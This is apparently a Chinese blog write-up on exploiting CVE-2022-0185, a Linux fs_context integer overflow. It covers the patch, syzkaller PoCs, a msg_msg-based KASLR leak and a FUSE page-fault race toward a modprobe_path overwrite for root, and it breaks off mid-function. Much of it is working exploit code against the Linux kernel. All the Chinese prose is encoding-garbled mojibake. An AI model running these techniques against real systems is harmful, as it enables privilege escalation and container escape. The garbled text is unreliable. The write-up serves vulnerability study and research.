---
layout: post
title: ã€kernel exploitã€‘CVE-2022-0185 File System Context æ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨
categories: [Kernel-exploit]
description: ã€kernel exploitã€‘CVE-2022-0185 File System Context æ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨
keywords: CVE, Kernel, Exploit
---

# ã€kernel exploitã€‘CVE-2022-0185 `File System Context` æ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨

**å½±å“ç‰ˆæœ¬**ï¼šLinux-v5.1~v5.16.2ã€‚[5.1-rc1](https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05) å¼•å…¥æ¼æ´ï¼ŒLinux-v5.16.2å·²ä¿®è¡¥ ï¼Œç”±syzkallerå‘ç°ã€‚è¯„åˆ†8.4åˆ†

**æµ‹è¯•ç‰ˆæœ¬**ï¼šLinux-5.16.1ï¼ˆå¤±è´¥ï¼Œ`msg_msg` å’Œæ¼æ´å¯¹è±¡ä½äºä¸åŒcacheï¼‰ Linux-5.11.22ï¼ˆæˆåŠŸï¼‰  [exploitåŠæµ‹è¯•ç¯å¢ƒä¸‹è½½åœ°å€](https://github.com/bsauce/kernel-exploit-factory)â€”https://github.com/bsauce/kernel-exploit-factory

**ç¼–è¯‘é€‰é¡¹**ï¼š

`CONFIG_CHECKPOINT_RESTORE`, `CONFIG_USER_NS`, `CONFIG_FUSE`, `CONFIG_SYSVIPC`, `CONFIG_USERFAULTFD`

åœ¨ç¼–è¯‘æ—¶å°†`.config`ä¸­çš„`CONFIG_E1000`å’Œ`CONFIG_E1000E`ï¼Œå˜æ›´ä¸º=yã€‚[å‚è€ƒ](https://blog.csdn.net/qq_16097611/article/details/104965045)

```c
$ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.16.1.tar.xz
$ tar -xvf linux-5.16.1.tar.xz
# KASAN: è®¾ç½® make menuconfig è®¾ç½®"Kernel hacking" ->"Memory Debugging" -> "KASan: runtime memory debugger"ã€‚
$ make -j32
$ make all
$ make modules
# ç¼–è¯‘å‡ºçš„bzImageç›®å½•ï¼š/arch/x86/boot/bzImageã€‚
```

**æ¼æ´æè¿°**ï¼šå†…æ ¸çš„ `File System Context` æ¨¡å—ï¼ˆæ–‡ä»¶ç³»ç»Ÿç¯å¢ƒï¼‰çš„`fs/fs_context.c`æ–‡ä»¶ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºå¯¼è‡´å †æº¢å‡ºã€‚æ”»å‡»è€…å¿…é¡»å…·å¤‡ `CAP_SYS_ADMIN` æƒé™ï¼Œæˆ–è€…ä½¿ç”¨å‘½åç©ºé—´æˆ–è€…ä½¿ç”¨`unshare(CLONE_NEWNS|CLONE_NEWUSER)` ï¼ˆç­‰åŒäºå‘½ä»¤`$ unshare -Urm`ï¼‰æ¥è¿›å…¥å«æœ‰`CAP_SYS_ADMIN`æƒé™çš„å‘½åç©ºé—´ã€‚dockerä¸­é»˜è®¤æ²¡æœ‰`CAP_SYS_ADMIN`æƒé™ï¼ˆå¯ç”¨å®¹å™¨æ—¶éœ€ä½¿ç”¨ â€œ-privilegedâ€ é€‰é¡¹ï¼‰ï¼Œä¸”dockerçš„`seccomp`è¿‡æ»¤ä¼šé»˜è®¤æ‹¦æˆª unshare å‘½ä»¤ï¼Œæ‰€ä»¥dockerä¸­æ— æ³•åˆ©ç”¨ï¼›ä½†æ˜¯ Kubernetes é›†ç¾¤åœ¨ä½¿ç”¨dockeræ—¶ï¼Œ`seccomp` è¿‡æ»¤é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œå¯ä»¥ææƒå’Œé€ƒé€¸ã€‚

**è¡¥ä¸**ï¼š[patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de2)

```c

diff --git a/fs/fs_context.c b/fs/fs_context.c
index b7e43a780a625..24ce12f0db32e 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
 			      param->key);
 	}
 
-	if (len > PAGE_SIZE - 2 - size)
+	if (size + len + 2 > PAGE_SIZE)
 		return invalf(fc, "VFS: Legacy: Cumulative options too large");
 	if (strchr(param->key, ',') ||
 	    (param->type == fs_value_is_string &&
```

**ä¿æŠ¤æœºåˆ¶**ï¼šKASLR / SMEP / SMAP / KPTI

**åˆ©ç”¨æ€»ç»“**ï¼š

æ–¹æ³•ä¸€ï¼šä¸¤æ¬¡è§¦å‘æ¼æ´ã€‚ç¼ºç‚¹æ˜¯ä¸€èˆ¬æ™®é€šç”¨æˆ·çš„è¯ï¼ŒFUSEä¸ä¸€å®šå¯ç”¨ã€‚

- ï¼ˆ1ï¼‰å…ˆåˆ©ç”¨æº¢å‡ºä¿®æ”¹ `msg_msg->m_ts` æ³„éœ²å†…æ ¸åŸºå€ï¼ˆè¶Šç•Œè¯»å– kmalloc-32 ä¸­çš„ `seq_operations` ç»“æ„ï¼‰ï¼›
- ï¼ˆ2ï¼‰å†åˆ©ç”¨FUSE ç”¨æˆ·é¡µé”™è¯¯å¤„ç† å’Œæº¢å‡ºç¯¡æ”¹ `msg_msg->next` å®ç°ä»»æ„åœ°å€å†™ï¼Œç¯¡æ”¹ `modprobe_path` ææƒã€‚

æ–¹æ³•äºŒï¼šç¼ºç‚¹æ˜¯éœ€è¦ä¸‰æ¬¡è§¦å‘æ¼æ´ï¼Œå †å–·ä¸ç¨³å®šã€‚

- ï¼ˆ1ï¼‰å…ˆåˆ©ç”¨æº¢å‡ºä¿®æ”¹ `msg_msg->m_ts` æ³„éœ²å†…æ ¸åŸºå€ï¼ˆè¶Šç•Œè¯»å– kmalloc-32 ä¸­çš„ `seq_operations` ç»“æ„ï¼‰ï¼›
- ï¼ˆ2ï¼‰æ³„éœ²å †åœ°å€ï¼šæ„é€ queue1ä¸­ ` kmalloc-4k <-> kmalloc-64`ï¼Œqueue2ä¸­ `kmalloc-1k <-> kmalloc-64 <-> kmalloc-512` ã€‚è§¦å‘æº¢å‡ºæ¼æ´ï¼Œæ”¹å¤§` kmalloc-4k` ä¸­çš„  `msg_msg->m_ts` æ¥è¶Šç•Œè¯»å– `msg->m_list.next & prev`ï¼Œä¹Ÿå³ kmalloc-1024 å’Œ kmalloc-512 çš„åœ°å€ï¼›
  - `pipe_buffer` å æ® kmalloc-1024ï¼›
  - kmalloc-512 ä¸Šå¸ƒç½® stack pivot gadget ï¼ˆä¼ªé€  `pipe_buffer->ops` å‡½æ•°è¡¨ï¼‰ï¼›
- ï¼ˆ3ï¼‰è§¦å‘æº¢å‡ºä¿®æ”¹ `msg_msg->next = &kmalloc-1024 - 0x30`ï¼Œæ„é€ ä»»æ„é‡Šæ”¾ï¼Œåˆ©ç”¨ msg_msg å †å–·ä¼ªé€  `pipe_buffer->ops` å¹¶å¸ƒç½® ROP chain ææƒã€‚ 



## 1. æ¼æ´å‘ç°

**syzkalleræŠ¥é”™**ï¼šé€šè¿‡syzkallerå‘ç°ä¸€ä¸ªæŠ¥é”™ã€‚

```c
BUG: KASAN: slab-out-of-bounds in legacy_parse_param+0x450/0x640 fs/fs_context.c:569
Write of size 1 at addr ffff88802d7d9000 by task syz-executor.12/386100

CPU: 3 PID: 386100 Comm: syz-executor.12 Not tainted 5.14.0 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
Call Trace:
 legacy_parse_param+0x450/0x640 fs/fs_context.c:569
 vfs_parse_fs_param+0x1fd/0x390 fs/fs_context.c:146
 vfs_fsconfig_locked+0x177/0x340 fs/fsopen.c:265
 __do_sys_fsconfig fs/fsopen.c:439 [inline]
[ ... ]
The buggy address belongs to the object at ffff88802d7d8000
 which belongs to the cache kmalloc-4k of size 4096
The buggy address is located 0 bytes to the right of
 4096-byte region [ffff88802d7d8000, ffff88802d7d9000)
```

æ¼æ´å¯¹è±¡ä½äº kmalloc-4096ï¼Œ`legacy_parse_param()` å‡½æ•°å¯¼è‡´OOB writeï¼Œsyzkallerç”Ÿæˆäº†ä¸€ä¸ªpoCï¼š

```c
#define _GNU_SOURCE 

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
uint64_t r[1] = {0xffffffffffffffff};
int main(void) {
	syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	intptr_t res = 0;
	memcpy((void*)0x20000000, "9p\000", 3);
	res = syscall(__NR_fsopen, 0x20000000ul, 0ul);
	if (res != -1)
		r[0] = res;
	memcpy((void*)0x20001c00, "\000\000\344]\233", 5);
	memcpy((void*)0x20000540, "<long string>", 641);
	syscall(__NR_fsconfig, r[0], 1ul, 0x20001c00ul, 0x20000540ul, 0ul);
	int i;
	for(i = 0; i < 64; i++) {
		syscall(__NR_fsconfig, r[0], 1ul, 0x20001c00ul, 0x20000540ul, 0ul);
	}
	memset((void*)0x20000040, 0, 1);
	memcpy((void*)0x20000800, "<long string>", 641);
	syscall(__NR_fsconfig, r[0], 1ul, 0x20000040ul, 0x20000800ul, 0ul);
	for(i = 0; i < 64; i++) {
		syscall(__NR_fsconfig, r[0], 1ul, 0x20000040ul, 0x20000800ul, 0ul);
	}
	return 0;
}
```

**PoCç¾åŒ–**ï¼šè¿™æ®µPoCçœ‹ä¸Šå»å¾ˆéš¾ç†è§£ï¼Œè¿˜åŒ…å«ä¸€äº›æ— å…³çš„è°ƒç”¨ï¼Œåªèƒ½é€šè¿‡äººå·¥åˆ†ææ¥å»é™¤æ— å…³ä»£ç ã€‚ä¾‹å¦‚ï¼Œmmapæ˜ å°„äº†å¾ˆå¤šåŒºåŸŸï¼Œä½†åªç”¨åˆ°äº†`0x20000000ul`ï¼Œæ‰€ä»¥å¯ä»¥å»æ‰æ— å…³çš„mmapè°ƒç”¨ï¼›`uint64_t r[1] = {0xffffffffffffffff};` å®é™…ä¸Šå°±æ˜¯ `int r = -1`ï¼›è¿˜è¦å°†åœ°å€è½¬åŒ–ä¸ºå˜é‡æˆ–å¸¸é‡ï¼Œæœ‰çš„è°ƒç”¨ `memcpy()` å°† `9P` å­—ç¬¦ä¸²æ‹·è´åˆ°bufferå¹¶å°†è¯¥bufferä¼ ç»™syscallï¼Œå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å­—ç¬¦ä¸²å³å¯ï¼Œä¸éœ€è¦è¿™ä¹ˆå¤æ‚ï¼Œæœ€ç»ˆè½¬åŒ–ä¸ºä»¥ä¸‹ä»£ç ï¼š

```c
int r = -1;
int main(void) {
	int res = 0;
	res = syscall(__NR_fsopen, "9p", 0ul);
	if (res != -1)
		r = res;
}
```

ç»è¿‡å¾ˆå¤šåˆ†æï¼Œå¯¹æ¯”inputå’Œç›¸å…³å†…æ ¸å‡½æ•°ï¼Œæœ€ç»ˆç”Ÿæˆä¸€ä¸ªç®€åŒ–çš„PoCï¼šè°ƒç”¨ `fsconfig` éœ€ä¼ å…¥ `FSCONFIG_SET_STRING` å’Œä¸¤ä¸ªå­—ç¬¦ä¸² key / valueï¼Œvalueå¿…é¡»ä»¥NULLç»“å°¾ï¼Œæœ€åä¸€ä¸ªå‚æ•°å¿…é¡»ä¸º0

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)
int main(void) { 
	char* key = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	int fd = 0;
	fd = fsopen("9p", 0);
	for (int i = 0; i < 130; i++) { 
		fsconfig(fd, FSCONFIG_SET_STRING, "\x00", key, 0);
	}
}
```

## 2. æ¼æ´åˆ†æ

**æ¼æ´å‡½æ•°è°ƒç”¨è·¯å¾„**ï¼š[__x64_sys_fsconfig()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fsopen.c#L439) -> [vfs_fsconfig_locked()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fsopen.c#L265) -> [vfs_parse_fs_param()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fs_context.c#L146) -> [legacy_parse_param()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fs_context.c#L551)

æ³¨æ„ [vfs_parse_fs_param()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fs_context.c#L146) ä¸­å‡½æ•°æŒ‡é’ˆå®šä¹‰åœ¨ [legacy_fs_context_ops](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fs_context.c#L637) å‡½æ•°è¡¨ä¸­ï¼Œåœ¨ [alloc_fs_context()](https://elixir.bootlin.com/linux/v5.16.1/source/fs/fs_context.c#L288) å‡½æ•°ä¸­å®Œæˆfilesystem context ç»“æ„çš„åˆ†é…å’Œåˆå§‹åŒ–ã€‚

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param) {
	struct legacy_fs_context *ctx = fc->fs_private;	// [1] ctx ä¸æ–‡ä»¶æè¿°ç¬¦ç›¸å…³
	unsigned int size = ctx->data_size;				// [2] size â€”â€” ç›®å‰å·²ç»å†™å…¥ buffer çš„é•¿åº¦
	size_t len = 0;
	int ret;
	[ ... ]
	switch (param->type) {
	case fs_value_is_string:
		len = 1 + param->size;						// [3] len = strlen(key) + 1 + strlen(value) å°†è¦å†™å…¥çš„é•¿åº¦, å¯¹åº”åˆ° mount option string key=value
	case fs_value_is_flag:
		len += strlen(param->key);
		break;
	default:
		return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported", param->key);
	}
	if (len > PAGE_SIZE-2-size) return invalf(fc, "VFS: Legacy: Cumulative options too large"); // [4] è¾¹ç•Œæ£€æŸ¥, é¿å…æº¢å‡º
	[ ... ]
	if (!ctx->legacy_data) {
		ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);	// [5] é¦–æ¬¡åˆ†é… 4096 å­—èŠ‚ç¼“å†²åŒº
		if (!ctx->legacy_data) return -ENOMEM;
	}
	ctx->legacy_data[size++] = ',';      			// [6] å¼€å§‹å¾€ buffer å†™æ•°æ®, å…ˆå†™ä¸ªé€—å·, å†å†™ key, å†å†™ ç­‰å·, å†å†™ value, æœ€åç»“å°¾å†™ NULL, ä¿å­˜æ–°çš„size
	len = strlen(param->key);
	memcpy(ctx->legacy_data + size, param->key, len);
	size += len;
	if (param->type == fs_value_is_string) {
		ctx->legacy_data[size++] = '=';
		memcpy(ctx->legacy_data + size, param->string, param->size);
		size += param->size;
	}
	ctx->legacy_data[size] = '\0';
	ctx->data_size = size;
	ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
	return 0;
}
```

**9p / ext4 è§¦å‘**ï¼š`fsopen()` æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç¯å¢ƒï¼Œç”¨æˆ·å¯ä»¥ç”¨æ¥mountæ–°çš„æ–‡ä»¶ç³»ç»Ÿã€‚ `9p` ï¼ˆthe Plan 9 filesystemï¼‰æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œèƒ½è§¦å‘æœ¬æ–‡æ¼æ´ï¼ŒLinuxä¸­å¸¸ç”¨çš„ext4æ–‡ä»¶ç³»ç»Ÿä¹Ÿèƒ½è§¦å‘æœ¬æ¼æ´ï¼ˆæœ¬æ–‡å°±æ˜¯åˆ©ç”¨ext4æ¥è§¦å‘æ¼æ´ï¼‰ã€‚`fsconfig()` è°ƒç”¨èƒ½è®©æˆ‘ä»¬å¾€`ctx->legacy_data` å†™å…¥ä¸€ä¸ªæ–°çš„ `(keyï¼Œvalue)`ï¼Œ`ctx->legacy_data`  æŒ‡å‘ä¸€ä¸ª 4096 å­—èŠ‚çš„ç¼“å†²åŒºï¼ˆåœ¨é¦–æ¬¡é…ç½®æ–‡ä»¶ç³»ç»Ÿæ—¶å°±è¿›è¡Œåˆ†é…ï¼‰ã€‚

**æ¼æ´åˆ†æ**ï¼š`[4]` å¤„ `len > PAGE_SIZE-2-size`ï¼Œ lenæ˜¯å°†è¦å†™çš„é•¿åº¦ï¼Œ`PAGE_SIZE == 4096` ï¼Œsize æ˜¯å·²å†™çš„é•¿åº¦ï¼Œ2å­—èŠ‚è¡¨ç¤ºä¸€ä¸ªé€—å·å’Œä¸€ä¸ªNULLç»ˆæ­¢ç¬¦ã€‚ é—®é¢˜åœ¨äºé‡‡ç”¨å‡æ³•æ¥è¿›è¡Œæ£€æŸ¥ï¼Œsizeæ˜¯`unsigned int` ï¼ˆæ€»æ˜¯è¢«å½“åšæ­£å€¼ï¼‰ï¼Œä¼šå¯¼è‡´æ•´æ•°æº¢å‡ºï¼Œå¦‚æœç›¸å‡çš„ç»“æœå°äº0ï¼Œè¿˜æ˜¯ä¼šè¢«åŒ…è£…æˆä¸€ä¸ªæ­£å€¼ã€‚ å¦‚æœ117æ¬¡æ·»åŠ é•¿åº¦ä¸º0çš„keyå’Œé•¿åº¦ä¸º33çš„valueï¼Œæœ€ç»ˆçš„sizeåˆ™ä¸º`(117*(33+2)) == 4095`ï¼Œè¿™æ ·`PAGE_SIZE-2-size == -1 == 18446744073709551615 `ï¼Œè¿™æ ·æ— è®ºlenå¤šå¤§éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚keyè®¾ç½®ä¸º `\x00`ï¼Œè¿™æ ·é€—å·ä¼šå†™å…¥åç§»4095ï¼Œç­‰å·å†™å…¥ä¸‹ä¸€ä¸ªkmalloc-4096çš„åç§»0å¤„ï¼Œæ¥ç€å°±èƒ½å¾€åç§»1å¤„å¼€å§‹å¾€åå†™valueã€‚

**æ¼æ´é™åˆ¶**ï¼škeyå’Œvalueéƒ½æ˜¯stringç±»å‹ï¼Œä¼šäº§ç”Ÿ`\x00`æˆªæ–­ã€‚å¯ä»¥é‡‡ç”¨valueæ¥ä¼ªé€  `msg_msg->m_ts`ï¼›åªæœ‰é‡‡ç”¨keyæ¥ä¼ªé€ `msg_msg->m_list.next`ã€‚å› ä¸º value åªèƒ½ä»é‚»è¿‘å †å—ï¼ˆkmalloc-4096ï¼‰çš„åç§»1å¤„å¼€å§‹è¦†ç›–ï¼Œå› ä¸ºç¬¬1ä¸ªé€—å· `,` ä¼šå†™åœ¨æ¼æ´å¯¹è±¡çš„åç§» 4095ï¼Œç­‰å·ä¼šå†™åœ¨é‚»è¿‘å †å—çš„åç§»0å¤„ï¼Œæ‰€ä»¥å¦‚æœè¦æ­£ç¡®ä¼ªé€  `msg_msg->m_list.next`ï¼Œåˆ™åªèƒ½åˆ©ç”¨keyæ¥ä¼ å€¼ã€‚

## 3. æ¼æ´åˆ©ç”¨æ–¹æ³•1â€”ä»»æ„å†™ç¯¡æ”¹ `modprobe_path`

#### 3-1 æ³„éœ²å†…æ ¸åŸºå€

**æ³„éœ²å†…æ ¸åŸºå€**ï¼šå–·å°„å¤§é‡ `seq_operations` â€”â€” `open(â€œ/proc/self/statâ€, O_RDONLY)` ï¼Œæº¢å‡ºç¯¡æ”¹ `msg_msg->m_ts` æ³„éœ²åœ°å€ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ã€‚

- ï¼ˆ1ï¼‰å‡†å¤‡ `fs_context ` æ¼æ´å¯¹è±¡ï¼›
- ï¼ˆ2ï¼‰å¾€ kmalloc-32 å–·å°„ `seq_operations` å¯¹è±¡ï¼›
- ï¼ˆ3ï¼‰å–·å°„ `msg_msg` æ¶ˆæ¯ ï¼ˆå¤§å°ä¸º `0xfe8`ï¼‰ï¼Œä¼šå°†è¾…åŠ©æ¶ˆæ¯åˆ†é…åœ¨ kmalloc-32ï¼›
- ï¼ˆ4ï¼‰è§¦å‘ kmalloc-4096 æº¢å‡ºï¼Œç¯¡æ”¹ `msg_msg->m_ts`ï¼›
- ï¼ˆ5ï¼‰åˆ©ç”¨ `msg_msg` è¶Šç•Œè¯»ã€‚æ³„éœ²å†…æ ¸æŒ‡é’ˆã€‚

```c
void *do_kaslr_leak () {
	uint64_t kbase = 0;
	char pat[0x30] = {0};
	char buffer[0x2000] = {0}, received[0x2000] = {0};
	msg *message = (msg *)buffer;
	int size = 0x1018;
	int targets[K_SPRAY] = {0};
	int i;
	// Spray queues/messages
	for (i = 0; i < K_SPRAY; i++) {
		memset(buffer, 0x41+i, sizeof(buffer));
		targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
		send_msg(targets[i], message, size - 0x30, 0);
	}
	// Spray function pointers
	for (int i = 0; i < 100; i++) {
		open("/proc/self/stat", O_RDONLY);
	}
	get_msg(targets[0], received, size - 0x30, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	memset(pat, 0x42, sizeof(pat));
	pat[sizeof(pat)-1] = '\x00';
	fd = fsopen("ext4", 0);
	if (fd < 0) {
		exit(-1);
	}
	strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
	for (int i = 0; i < 117; i++) {
		fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
	}
	// Corrupt the size field to 0x1060
	char tiny[] = "DDDDDDD";
	char tiny_evil[] = "DDDDDD\x60\x10";
	fsconfig(fd, FSCONFIG_SET_STRING, "CCCCCCCC", tiny, 0);
	fsconfig(fd, FSCONFIG_SET_STRING, "\x00", tiny_evil, 0);
	size = 0x1060;
	for (int i = 0; i < K_SPRAY; i++) {
		get_msg(targets[i], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
		// Check for valid kernel pointer and aligned base
		kbase = do_check_leak(received);
		if (kbase) {
			return (void*)kbase;
		}
	}
	puts("[X] No leaks, trying again");
	close(fd);
	return 0;
}

```

#### 3-2 ä»»æ„åœ°å€å†™æ€è·¯

**ä»»æ„å†™**ï¼šåˆ©ç”¨ç«äº‰æ¡ä»¶ã€‚

- ï¼ˆ1ï¼‰åˆ†é…ç¬¬1ä¸ªæ¶ˆæ¯å—ï¼›
- ï¼ˆ2ï¼‰æ‹·è´ç¬¬1ä¸ªæ¶ˆæ¯ï¼Œè§¦å‘é¡µé”™è¯¯æš‚åœï¼›
- ï¼ˆ3ï¼‰åˆ†é…ç¬¬2ä¸ªæ¶ˆæ¯å—ï¼›
- ï¼ˆ4ï¼‰è¦†ç›–ç¬¬1ä¸ªæ¶ˆæ¯çš„nextæŒ‡é’ˆï¼›
- ï¼ˆ5ï¼‰æˆ‘ä»¬çš„æ•°æ®è¢«æ‹·è´åˆ°nextæŒ‡é’ˆæŒ‡å‘çš„åœ°å€ã€‚

æˆ‘ä»¬è¦ç¡®ä¿ï¼ˆ4ï¼‰å‘ç”Ÿåœ¨ï¼ˆ5ï¼‰ä¹‹å‰ï¼Œå¯ä»¥ç”¨ userfaultfdï¼Œä½†æ˜¯5.11ç‰ˆæœ¬ä»¥åå°±æ— æ³•åœ¨ç”¨æˆ·å±‚å¤„ç†å†…æ ¸å±‚çš„é¡µé”™è¯¯äº†ï¼›è¿˜æœ‰ç§æ–¹æ³•æ˜¯åˆ©ç”¨FUSEã€‚

#### 3-3 FUSE é¡µé”™è¯¯å¤„ç†

**FUSEç®€ä»‹**ï¼šå†…æ ¸å…è®¸ç”¨æˆ·å®ç°è‡ªå·±çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿï¼ˆ**F**ilsystem in **USE**rspaceï¼‰ï¼Œæœ‰è‡ªå·±çš„`read` / `write` ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ ·å‘ç”Ÿç¼ºé¡µæ—¶è¿˜æ˜¯ä¼šå›åˆ°ç”¨æˆ·æ€æ¥å¤„ç†ä¸­æ–­ã€‚æˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªè¿·ä½ çš„ FUSE æ–‡ä»¶ç³»ç»Ÿï¼ˆé€šè¿‡å’Œ`/dev/fuse`äº¤äº’ï¼‰ï¼Œæ‰“å¼€å¹¶è°ƒç”¨`mmap`æ˜ å°„åˆ°å†…å­˜ï¼Œå°†è¿”å›åœ°å€ä¼ åˆ°å†…æ ¸ï¼Œå½“å†…æ ¸å°è¯•è¯»å–FUSEä¸­çš„åœ°å€æ—¶ï¼Œä¼šè°ƒç”¨æˆ‘ä»¬å®šä¹‰çš„ `read` å¤„ç†å‡½æ•°ï¼Œä¸ºäº†åªåœ¨è¯»ç¬¬ä¸€ä¸ª4096å †å—æ•°æ®ä¹‹åè§¦å‘é¡µé”™è¯¯ï¼Œæˆ‘ä»¬å°†åˆ†é…ä¸¤å—å†…å­˜ï¼Œç¬¬ä¸€å—æ˜¯å¸¸è§„å†…å­˜ï¼Œç¬¬2å—æ˜¯FUSEç›¸å…³çš„ã€‚

**é—®é¢˜**ï¼šä¸€æ˜¯FUSEè¦æ±‚æˆ‘ä»¬éç‰¹æƒç”¨æˆ·èƒ½è®¿é—® `/bin/fusermount`ï¼Œé€šè¿‡unshareèƒ½ç»•è¿‡è¯¥é™åˆ¶ï¼›äºŒæ˜¯ç”¨æˆ·éœ€è¦å†™ä¸ª `libfuse` åº“ä½¿ `libfuse` å‡½æ•°æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯ `libfuse` å¾ˆéš¾é™æ€é“¾æ¥ ï¼ˆè§ [issue](https://github.com/libfuse/libfuse/issues/383)ï¼Œå› ä¸ºä¾èµ–äº `dl_open`ï¼‰ä½œè€…ç›´æ¥ç§»é™¤äº†æ‰€æœ‰å¯¹ `dl_open` çš„å¼•ç”¨ï¼Œå¹¶é‡æ–°ç¼–è¯‘äº† `libfuse` åº“ï¼Œè¿™æ ·FUSEæŠ€æœ¯å°±èƒ½åº”ç”¨äºæ‰€æœ‰å¼€å¯ `CONFIG_FUSE` çš„å†…æ ¸äº†ã€‚

```c
void *evil_page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
uint64_t race_page = 0x1338000;
puts("[*] Preparing fault handlers via FUSE");
int evil_fd = open("evil/evil", O_RDWR);
if (evil_fd < 0) {
  perror("evil fd failed");
  exit(-1);
}
if ((mmap(0x1338000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, evil_fd, 0)) != 0x1338000) {
  perror("mmap fail fuse 1");
  exit(-1);
}
```

#### 3-4 å®Œæ•´åˆ©ç”¨

**æ€»ä½“åˆ©ç”¨æ­¥éª¤**ï¼š

- ï¼ˆ1ï¼‰æ‰“å¼€pipeå¯¹ï¼Œä¸¤ä¸ªè¿›ç¨‹å…±äº«ä¸€å—å¯å‘é€æ•°æ®çš„å†…å­˜ï¼Œå¯ç”¨äºåŒæ­¥ï¼ˆä¿è¯ç¯¡æ”¹`msg_msg->next` ä¹‹åå†å¤„ç†ç”¨æˆ·é¡µé”™è¯¯ï¼Œç»§ç»­æ‹·è´ä»¥ç¯¡æ”¹ `modprobe_path`ï¼‰ï¼›
- ï¼ˆ2ï¼‰åœ¨expä¸­forkå‡ºå­è¿›ç¨‹ç”¨äºè¿è¡ŒFUSEï¼Œå¤„ç†æ–‡ä»¶ç³»ç»Ÿè¯·æ±‚ï¼›
- ï¼ˆ3ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼ˆè§ `3-1` åœ°å€æ³„éœ²æ­¥éª¤ï¼‰ï¼›
- ï¼ˆ4ï¼‰open/mmap evil fileï¼ˆå°†fusefdæ˜ å°„åˆ°åœ°å€`0x1338000`ï¼Œè¿™æ ·msg copy è®¿é—®åˆ°è¯¥åœ°å€æ—¶è§¦å‘é¡µé”™è¯¯å¤„ç†ï¼‰ï¼›
- ï¼ˆ5ï¼‰å‡†å¤‡å †æº¢å‡ºï¼Œè°ƒç”¨ `fsopen` å’Œ `fsconfig`ï¼›
- ï¼ˆ6ï¼‰åˆ›å»ºå­çº¿ç¨‹æº¢å‡ºè¦†ç›– next æŒ‡é’ˆï¼›
- ï¼ˆ7ï¼‰åŒæ—¶ï¼Œä¸»çº¿ç¨‹è§¦å‘ `msg_send`ï¼Œè®©æ­¥äºFUSEä»£ç æ¥å¤„ç†é¡µé”™è¯¯ï¼›
- ï¼ˆ8ï¼‰FUSEåœ¨å…±äº«pipeä¸Šè°ƒç”¨readï¼Œè§¦å‘é˜»å¡ï¼Œç›´åˆ°æœ‰å­—èŠ‚å†™å…¥pipeï¼›
- ï¼ˆ9ï¼‰åˆ°è¿™é‡Œï¼Œæº¢å‡ºçº¿ç¨‹å†™å…¥pipeï¼ˆè¡¨ç¤º `msg_msg->next` å·²è¢«ç¯¡æ”¹ï¼‰ï¼Œå¯¼è‡´FUSEé‡Šæ”¾ï¼Œçº¿ç¨‹å°†æ¶æ„æ•°æ®æ‹·è´åˆ°ç›®æ ‡åœ°å€ã€‚

**å†™ç›®æ ‡**ï¼š`modprobe_path`ã€‚

```c
char *modprobe_win = "/tmp/w";
#define  SHELL  "/bin/bash"
[ ... ]
void modprobe_init() {
  int fd;
  [ ... ]
